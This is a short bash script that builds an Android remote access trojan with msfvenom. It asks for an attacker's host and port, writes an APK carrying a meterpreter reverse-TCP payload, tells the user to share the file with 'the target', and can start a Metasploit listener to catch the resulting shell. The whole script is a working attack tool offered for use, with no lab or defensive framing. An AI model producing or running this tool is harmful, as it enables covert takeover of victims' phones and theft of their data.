#!/bin/bash

echo "[*] Fortress Payload Generator (Android RAT - MSFVenom Based)"

read -p "Enter your LHOST (e.g., your public IP or VPS): " LHOST
read -p "Enter LPORT (e.g., 4444): " LPORT

mkdir -p ~/FortressPayloads
cd ~/FortressPayloads

echo "[*] Generating payload..."

msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > rat_payload.apk

echo "[✓] Payload created: ~/FortressPayloads/rat_payload.apk"
echo "Share this file with the target. You must run a listener to catch the shell."

read -p "Start listener now? (y/n): " confirm
if [[ "$confirm" == "y" ]]; then
    msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"
fi
